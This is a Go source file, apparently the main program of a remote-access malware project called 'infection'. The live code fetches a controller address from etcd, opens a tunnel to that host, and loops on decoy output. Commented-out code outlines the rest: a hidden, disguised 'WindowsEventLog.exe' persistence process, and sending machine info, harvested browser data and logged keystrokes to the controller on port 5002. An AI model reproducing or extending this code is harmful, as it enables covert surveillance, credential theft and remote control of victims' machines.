package main

import (
	"fmt"
	"infection/etcd"
	"infection/tunnel"
	"net/http"
	"time"

	"sync/atomic"
)

type Info struct {
	Dev bool
}

var Config = Info{
	true,
}

type AppConfig struct {
	Url string
}

// confirm lock
type AppConfigMgr struct {
	config atomic.Value
}

var appConfigMgr = &AppConfigMgr{}

func (a *AppConfigMgr) Callback(conf *etcd.Config) {
	appConfig := &AppConfig{}
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(appConfig)
}

//func init() {
//	lib.KillCheck()
//	//currentprogram path log
//	content, _ := lib.GetTargetPath()
//	data := []byte(content)
//	// paht log
//	if ioutil.WriteFile(lib.NOGUILOG, data, 0644) == nil {
//	}
//	//fixed ioop download check
//	_, cerr := os.Stat(lib.CURRENTPATH + "WindowsEventLog.exe")
//	if cerr != nil {
//		//keep the main process live
//		lib.MultiFileDown([]string{}, "init")
//
//		cmd := exec.Command(lib.CURRENTPATH + "WindowsEventLog.exe")
//		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//		cmd.Start()
//	} else {
//		cmd := exec.Command(lib.CURRENTPATH + "WindowsEventLog.exe")
//		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//		cmd.Start()
//	}
//}

func handler(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "hello world")
}
func main() {
	conf, _ := etcd.NewConfig()
	conf.AddObserver(appConfigMgr)
	var appConfig AppConfig
	appConfig.Url = conf.Url
	appConfigMgr.config.Store(&appConfig)
	//if lib.CheckInlib(conf.Url) != nil {
	//	finflag := make(chan string)
	//	go machineinfo.MachineSend(conf.Url, finflag)
	//	<-finflag
	//	if lib.FileExits(lib.BrowserSafepath) != nil {
	//		go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
	//	}
	//	//go tunnel.Tunnel(addr)
	//	go hitboard.KeyBoardCollection("http://" + conf.Url + ":5002/keyboard/record")
	//} else if lib.FileExits(lib.BrowserSafepath) != nil {
	//	finflag := make(chan string)
	//	go browser.Digpack("http://"+conf.Url+":5002/browser/", finflag)
	//}
	//go killit.Killit()
	//go killit.GetPic(conf.Url)
	go tunnel.Tunnel(conf.Url)
	a := []string{"01x3b", "00x10", "02x10", "00x50", "7bx10", "80x55", "ffx40"}
	for {
		ticker := time.NewTicker(4 * time.Second)
		for _, name := range a {
			fmt.Println(name)
			time.Sleep(2 * time.Second)
		}
		<-ticker.C
	}
	////check update
	//go lib.DoUpdate()
	//http.HandleFunc("/hello", handler)
	//if err := http.ListenAndServe(":11000", nil); err != nil {
	//	log.Println("pac Faild", err)
	//}
}
